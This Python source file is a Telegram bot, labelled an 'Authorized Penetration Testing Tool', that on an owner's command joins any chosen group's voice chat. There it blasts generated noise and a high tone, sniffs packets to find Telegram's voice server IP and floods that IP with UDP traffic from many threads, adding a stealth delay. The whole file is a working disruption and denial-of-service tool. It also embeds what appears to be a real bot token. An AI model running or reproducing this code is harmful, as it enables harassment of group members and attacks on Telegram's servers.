#!/usr/bin/env python3
"""
Telegram VC Disruptor — Bot Controlled 🤖
Authorized Penetration Testing Tool

Commands:
  /start - Show available commands
  /status - Check bot status
  /target <link_or_id> - Set target group
  /attack - Start disruption
  /stop - Stop active attack
  /settings - Show current settings
  /set <param> <value> - Change parameter
  /reset - Reset all settings
"""

import asyncio
import io
import json
import os
import socket
import struct
import threading
import time
import random
import sys
import wave
import numpy as np
from datetime import datetime

# Telegram client imports
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import UserNotParticipant

from pytgcalls import PyTgCalls
from pytgcalls.types import AudioPiped

# ═══════════════════════════════════════════════════
# CONFIGURATION — User ko edit karna hai
# ═══════════════════════════════════════════════════

# Bot Config
BOT_TOKEN = "8524730431:AAGORdQFDXoDWtb6oeVD41aRBCd3x6YLNKQ"  # @BotFather se
OWNER_ID = 7302427268  # Step 2 mein mila user ID

# Telegram Account (Session)
SESSION_STRING = "BQAN3s...apna_session_string..."  # @SessionStringBot se

# Attack Defaults
AUDIO_DURATION = 20
AUDIO_AMPLITUDE = 0.95
TONE_FREQUENCY = 8500
UDP_THREADS = 20
UDP_DURATION = 30
UDP_PORT = 26000
STEALTH_MODE = True

# Config file
CONFIG_FILE = "tg_vc_bot_config.json"

# Telegram CIDR prefixes for IP detection
TELEGRAM_PREFIXES = [
    "91.108.56.", "91.108.4.", "91.108.8.", "91.108.12.",
    "149.154.167.", "149.154.175.", "149.154.160.",
    "95.161.76.", "95.161.64."
]

# ═══════════════════════════════════════════════════

# Global state
bot_state = {
    "target_id": None,
    "target_name": None,
    "vc_ip": None,
    "vc_port": None,
    "is_attacking": False,
    "attack_start": None,
    "udp_threads": [],
    "app": None,
    "pytgcalls": None,
    "status": "idle"
}

# ─── SAVE/LOAD CONFIG ───

def save_bot_config():
    data = {
        "target_id": bot_state["target_id"],
        "target_name": bot_state["target_name"],
        "audio_duration": AUDIO_DURATION,
        "audio_amplitude": AUDIO_AMPLITUDE,
        "tone_frequency": TONE_FREQUENCY,
        "udp_threads": UDP_THREADS,
        "udp_duration": UDP_DURATION,
        "stealth_mode": STEALTH_MODE,
        "last_updated": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    with open(CONFIG_FILE, "w") as f:
        json.dump(data, f, indent=4)

def load_bot_config():
    global AUDIO_DURATION, AUDIO_AMPLITUDE, TONE_FREQUENCY
    global UDP_THREADS, UDP_DURATION, STEALTH_MODE
    
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                data = json.load(f)
                
            bot_state["target_id"] = data.get("target_id")
            bot_state["target_name"] = data.get("target_name")
            AUDIO_DURATION = data.get("audio_duration", AUDIO_DURATION)
            AUDIO_AMPLITUDE = data.get("audio_amplitude", AUDIO_AMPLITUDE)
            TONE_FREQUENCY = data.get("tone_frequency", TONE_FREQUENCY)
            UDP_THREADS = data.get("udp_threads", UDP_THREADS)
            UDP_DURATION = data.get("udp_duration", UDP_DURATION)
            STEALTH_MODE = data.get("stealth_mode", STEALTH_MODE)
            print("[✓] Config loaded.")
        except:
            print("[!] Config corrupted, using defaults.")

# ─── UDP IP DETECTOR ───

def detect_vc_ip(duration=15):
    print(f"[🔍] Detecting VC server IP ({duration}s)...")
    
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
    except:
        return None, None
    
    ips = {}
    start = time.time()
    
    while time.time() - start < duration:
        try:
            packet = sock.recvfrom(65536)[0]
            src_ip = socket.inet_ntoa(packet[26:30])
            dst_ip = socket.inet_ntoa(packet[30:34])
            protocol = packet[23]
            
            if protocol == 17:
                udp_header = packet[34:42]
                src_port, dst_port = struct.unpack("!HH", udp_header[:4])
                
                if 25000 <= dst_port <= 27000 or 25000 <= src_port <= 27000:
                    for prefix in TELEGRAM_PREFIXES:
                        if src_ip.startswith(prefix):
                            ips[src_ip] = ips.get(src_ip, 0) + 1
                            break
                        elif dst_ip.startswith(prefix):
                            ips[dst_ip] = ips.get(dst_ip, 0) + 1
                            break
        except:
            continue
    
    sock.close()
    
    if ips:
        best_ip = max(ips, key=ips.get)
        print(f"[✅] VC IP: {best_ip}")
        return best_ip, UDP_PORT
    return None, None

# ─── UDP FLOOD ───

def udp_flood_worker(ip, port, duration, tid, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    timeout = time.time() + duration
    sent = 0
    
    while time.time() < timeout and not stop_event.is_set():
        try:
            payload = random._urandom(random.randint(512, 1400))
            sock.sendto(payload, (ip, port))
            sent += 1
            time.sleep(random.uniform(0.001, 0.005))
        except:
            pass
    sock.close()
    return sent

def start_udp_flood(ip, port, duration, threads, stop_event):
    print(f"[🌊] UDP Flood: {ip}:{port} x{threads} threads x{duration}s")
    results = []
    thread_list = []
    
    for i in range(threads):
        t = threading.Thread(
            target=lambda: results.append(udp_flood_worker(ip, port, duration, i+1, stop_event))
        )
        t.daemon = True
        thread_list.append(t)
        t.start()
    
    for t in thread_list:
        t.join()
    
    total = sum(results) if results else 0
    print(f"[✅] UDP Flood done: ~{total} packets")
    return total

def stop_udp_flood(stop_event):
    stop_event.set()
    print("[⏹️] UDP Flood stop signal sent")

# ─── AUDIO GENERATOR ───

def generate_disruptive_audio(duration_sec=AUDIO_DURATION,
                               sample_rate=48000,
                               noise_amp=AUDIO_AMPLITUDE,
                               tone_freq=TONE_FREQUENCY):
    samples = int(duration_sec * sample_rate)
    t = np.linspace(0, duration_sec, samples, endpoint=False)
    
    noise = np.random.normal(0, noise_amp, samples).astype(np.float32)
    tone = 0.4 * np.sin(2 * np.pi * tone_freq * t)
    pulse = 0.3 * (0.5 + 0.5 * np.sin(2 * np.pi * 20 * t))
    
    mixed = noise + tone + pulse
    mixed = np.clip(mixed, -1.0, 1.0)
    pcm_data = (mixed * 32767).astype(np.int16)
    
    buf = io.BytesIO()
    with wave.open(buf, 'wb') as wf:
        wf.setnchannels(1)
        wf.setsampwidth(2)
        wf.setframerate(sample_rate)
        wf.writeframes(pcm_data.tobytes())
    
    buf.seek(0)
    return buf

# ─── TELEGRAM BOT HANDLERS ───

def owner_only(func):
    """Decorator: Only owner can use commands"""
    async def wrapper(client, message: Message):
        if message.from_user.id != OWNER_ID:
            await message.reply("❌ Unauthorized! Sirf owner commands use kar sakta hai.")
            return
        return await func(client, message)
    return wrapper

@owner_only
async def start_cmd(client, message: Message):
    text = """
🤖 **VC Disruptor Bot — Active**

**Available Commands:**

🎯 `/target <link_or_id>` — Set target group
⚔️ `/attack` — Start disruption
⏹️ `/stop` — Stop active attack
📊 `/status` — Current status & settings

⚙️ `/set <param> <value>` — Change settings
📋 `/settings` — Show all settings
🔄 `/reset` — Reset to defaults

**Parameters you can change:**
• `duration` — Audio duration (sec)
• `udp_duration` — UDP flood duration (sec)  
• `threads` — UDP threads (5-50)
• `tone` — Tone frequency Hz (5000-12000)
• `stealth` — Stealth mode (True/False)
"""
    await message.reply(text)

@owner_only
async def status_cmd(client, message: Message):
    status = bot_state["status"]
    target = bot_state["target_name"] or "Not set"
    target_id = bot_state["target_id"] or "N/A"
    vc_ip = bot_state["vc_ip"] or "Not detected"
    
    text = f"""
📊 **Bot Status**

**State:** `{status}`
**Target:** {target} (`{target_id}`)
**VC IP:** {vc_ip}

**Settings:**
• Audio: {AUDIO_DURATION}s | Tone: {TONE_FREQUENCY}Hz
• UDP: {UDP_DURATION}s | Threads: {UDP_THREADS}
• Stealth: {STEALTH_MODE}

**Attack active:** {'Yes' if bot_state['is_attacking'] else 'No'}
"""
    if bot_state["attack_start"]:
        elapsed = int(time.time() - bot_state["attack_start"])
        text += f"**Elapsed:** {elapsed}s"
    
    await message.reply(text)

@owner_only
async def target_cmd(client, message: Message):
    if len(message.command) < 2:
        await message.reply("❌ Usage: /target <group_link_or_id>")
        return
    
    link = message.text.split(" ", 1)[1].strip()
    
    # Try to find/join the group using user account (not bot)
    try:
        bot_state["status"] = "connecting"
        await message.reply(f"[🔗] Processing: {link}")
        
        # Use the Pyrogram client (user account)
        app = bot_state["app"]
        
        if link.startswith("http") or link.startswith("t.me"):
            try:
                chat = await app.join_chat(link)
                bot_state["target_id"] = chat.id
                bot_state["target_name"] = chat.title
                await message.reply(f"[✅] Target set: **{chat.title}**\nID: `{chat.id}`")
            except Exception as e:
                # Maybe already a member
                try:
                    if "t.me/" in link:
                        username = link.split("/")[-1]
                        if username.startswith("+"):
                            # Private link, can't resolve directly
                            await message.reply("[!] Private link. Ensure you've already joined.")
                            return
                        chat = await app.get_chat(username)
                    else:
                        chat = await app.get_chat(link)
                    
                    bot_state["target_id"] = chat.id
                    bot_state["target_name"] = chat.title
                    await message.reply(f"[✅] Target set: **{chat.title}**\nID: `{chat.id}`")
                except:
                    await message.reply(f"[!] Could not find/join group: {e}")
                    return
        else:
            # Direct ID
            try:
                chat_id = int(link)
                chat = await app.get_chat(chat_id)
                bot_state["target_id"] = chat.id
                bot_state["target_name"] = chat.title
                await message.reply(f"[✅] Target set: **{chat.title}**\nID: `{chat.id}`")
            except:
                await message.reply("[!] Invalid link or ID.")
                return
        
        bot_state["status"] = "target_set"
        save_bot_config()
        
    except Exception as e:
        await message.reply(f"[!] Error: {e}")
        bot_state["status"] = "error"

@owner_only
async def attack_cmd(client, message: Message):
    if bot_state["is_attacking"]:
        await message.reply("⚠️ Attack already in progress! Use /stop first.")
        return
    
    if not bot_state["target_id"]:
        await message.reply("❌ No target set! Use /target first.")
        return
    
    app = bot_state["app"]
    pytgcalls = bot_state["pytgcalls"]
    chat_id = bot_state["target_id"]
    
    await message.reply(f"🚀 **Starting attack on {bot_state['target_name']}...**")
    bot_state["status"] = "attacking"
    bot_state["is_attacking"] = True
    bot_state["attack_start"] = time.time()
    
    stop_event = threading.Event()
    bot_state["stop_event"] = stop_event
    
    try:
        # Step 1: Detect VC IP
        await message.reply("[🔍] Detecting VC server IP (15s)...")
        vc_ip, vc_port = detect_vc_ip(15)
        bot_state["vc_ip"] = vc_ip
        
        # Step 2: Join VC with audio
        audio_buf = generate_disruptive_audio()
        
        if STEALTH_MODE:
            wait = random.uniform(2, 5)
            await asyncio.sleep(wait)
        
        await pytgcalls.join_group_call(chat_id, AudioPiped(audio_buf))
        await message.reply(f"[✅] Audio flood active! Playing for {AUDIO_DURATION}s")
        
        # Step 3: Start UDP flood in background
        if vc_ip:
            udp_thread = threading.Thread(
                target=lambda: start_udp_flood(vc_ip, vc_port, UDP_DURATION, UDP_THREADS, stop_event),
                daemon=True
            )
            udp_thread.start()
            await message.reply(f"[🌊] UDP flood started: {vc_ip}:{vc_port}")
        else:
            await message.reply("[⚠️] No VC IP detected. Audio-only attack.")
        
        # Step 4: Wait for audio to finish
        await asyncio.sleep(AUDIO_DURATION + 2)
        
        # Step 5: Leave VC
        try:
            await pytgcalls.leave_group_call(chat_id)
        except:
            pass
        
        # Step 6: Stop UDP
        stop_udp_flood(stop_event)
        
        elapsed = int(time.time() - bot_state["attack_start"])
        await message.reply(f"[✅] **Attack complete!** Duration: {elapsed}s")
        
    except Exception as e:
        await message.reply(f"[❌] Attack error: {e}")
    finally:
        bot_state["is_attacking"] = False
        bot_state["status"] = "target_set"

@owner_only
async def stop_cmd(client, message: Message):
    if not bot_state["is_attacking"]:
        await message.reply("ℹ️ No active attack to stop.")
        return
    
    # Stop UDP flood
    if bot_state.get("stop_event"):
        stop_udp_flood(bot_state["stop_event"])
    
    # Leave VC
    try:
        pytgcalls = bot_state["pytgcalls"]
        chat_id = bot_state["target_id"]
        await pytgcalls.leave_group_call(chat_id)
    except:
        pass
    
    bot_state["is_attacking"] = False
    bot_state["status"] = "idle"
    
    elapsed = int(time.time() - bot_state["attack_start"]) if bot_state["attack_start"] else 0
    await message.reply(f"[⏹️] Attack stopped after {elapsed}s.")

@owner_only
async def settings_cmd(client, message: Message):
    text = f"""
📋 **Current Settings**

• `duration` = {AUDIO_DURATION} (Audio flood seconds)
• `udp_duration` = {UDP_DURATION} (UDP flood seconds)
• `threads` = {UDP_THREADS} (UDP threads)
• `tone` = {TONE_FREQUENCY} Hz
• `amplitude` = {AUDIO_AMPLITUDE}
• `stealth` = {STEALTH_MODE}

**Target:** {bot_state['target_name'] or 'Not set'}
**VC IP:** {bot_state['vc_ip'] or 'Not detected'}
"""
    await message.reply(text)

@owner_only
async def set_cmd(client, message: Message):
    if len(message.command) < 3:
        await message.reply("❌ Usage: /set <param> <value>\nExample: /set duration 30")
        return
    
    param = message.command[1].lower()
    value = message.command[2]
    
    global AUDIO_DURATION, UDP_DURATION, UDP_THREADS
    global TONE_FREQUENCY, AUDIO_AMPLITUDE, STEALTH_MODE
    
    changes = {
        "duration": ("AUDIO_DURATION", lambda v: int(v)),
        "udp_duration": ("UDP_DURATION", lambda v: int(v)),
        "threads": ("UDP_THREADS", lambda v: max(1, min(100, int(v)))),
        "tone": ("TONE_FREQUENCY", lambda v: max(3000, min(15000, int(v)))),
        "amplitude": ("AUDIO_AMPLITUDE", lambda v: max(0.1, min(1.0, float(v)))),
        "stealth": ("STEALTH_MODE", lambda v: v.lower() in ("true", "yes", "1")),
    }
    
    if param in changes:
        var_name, converter = changes[param]
        try:
            val = converter(value)
            globals()[var_name] = val
            save_bot_config()
            await message.reply(f"[✅] `{var_name}` = `{val}`")
        except:
            await message.reply(f"[!] Invalid value for {param}")
    else:
        valid = ", ".join(changes.keys())
        await message.reply(f"[!] Unknown param. Valid: {valid}")

@owner_only
async def reset_cmd(client, message: Message):
    global AUDIO_DURATION, AUDIO_AMPLITUDE, TONE_FREQUENCY
    global UDP_THREADS, UDP_DURATION, STEALTH_MODE
    
    AUDIO_DURATION = 20
    AUDIO_AMPLITUDE = 0.95
    TONE_FREQUENCY = 8500
    UDP_THREADS = 20
    UDP_DURATION = 30
    STEALTH_MODE = True
    
    bot_state["target_id"] = None
    bot_state["target_name"] = None
    bot_state["vc_ip"] = None
    
    if os.path.exists(CONFIG_FILE):
        os.remove(CONFIG_FILE)
    
    await message.reply("[✅] Reset to defaults. /target set karna hoga dobara.")

# ─── MAIN ───

async def main():
    print(r"""
    ╔══════════════════════════════════════════════════════════════╗
    ║   Telegram VC Disruptor — BOT CONTROLLED 🤖                 ║
    ║   Bot se command do -> Attack ho jaye                       ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Load config
    load_bot_config()
    
    # Verify bot token
    if BOT_TOKEN == "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz1234567890":
        print("[!] BOT_TOKEN set karna bhool gaye! @BotFather se token daalein.")
        sys.exit(1)
    
    # Verify session string
    if SESSION_STRING.startswith("BQAN3s") == False or len(SESSION_STRING) < 50:
        print("[!] SESSION_STRING set karna bhool gaye! @SessionStringBot se lo.")
        sys.exit(1)
    
    print("[📡] Initializing user account (Pyrogram)...")
    
    # Initialize User Account (for VC)
    try:
        app = Client("vc_bot_session", session_string=SESSION_STRING, in_memory=True)
        await app.start()
        user = await app.get_me()
        print(f"[👤] User: {user.first_name} (ID: {user.id})")
    except Exception as e:
        print(f"[!] User login failed: {e}")
        sys.exit(1)
    
    # Initialize PyTgCalls
    try:
        pytgcalls = PyTgCalls(app)
        await pytgcalls.start()
        print("[📞] PyTgCalls ready!")
    except Exception as e:
        print(f"[!] PyTgCalls failed: {e}")
        sys.exit(1)
    
    # Store in global state
    bot_state["app"] = app
    bot_state["pytgcalls"] = pytgcalls
    
    print("[🤖] Starting Telegram Bot...")
    
    # Initialize Bot
    bot = Client(
        "vc_disruptor_bot",
        bot_token=BOT_TOKEN,
        api_id=0,  # Bot ke liye api_id 0 bhi chalega
        api_hash=""
    )
    
    # Register handlers
    bot.on_message(filters.command("start"))(start_cmd)
    bot.on_message(filters.command("status"))(status_cmd)
    bot.on_message(filters.command("target"))(target_cmd)
    bot.on_message(filters.command("attack"))(attack_cmd)
    bot.on_message(filters.command("stop"))(stop_cmd)
    bot.on_message(filters.command("settings"))(settings_cmd)
    bot.on_message(filters.command("set"))(set_cmd)
    bot.on_message(filters.command("reset"))(reset_cmd)
    
    print("\n" + "="*55)
    print("  ✅ BOT IS RUNNING!")
    print("  Telegram mein apne bot ko search karo")
    print("  Aur commands bhejo!")
    print("="*55)
    print(f"\n  First: /target <group_link>")
    print(f"  Then:  /attack")
    print(f"  Stop:  /stop\n")
    
    try:
        await bot.start()
        # Keep running
        while True:
            await asyncio.sleep(10)
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
    finally:
        await bot.stop()
        await pytgcalls.stop()
        await app.stop()
        print("[✓] Clean exit.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(0)
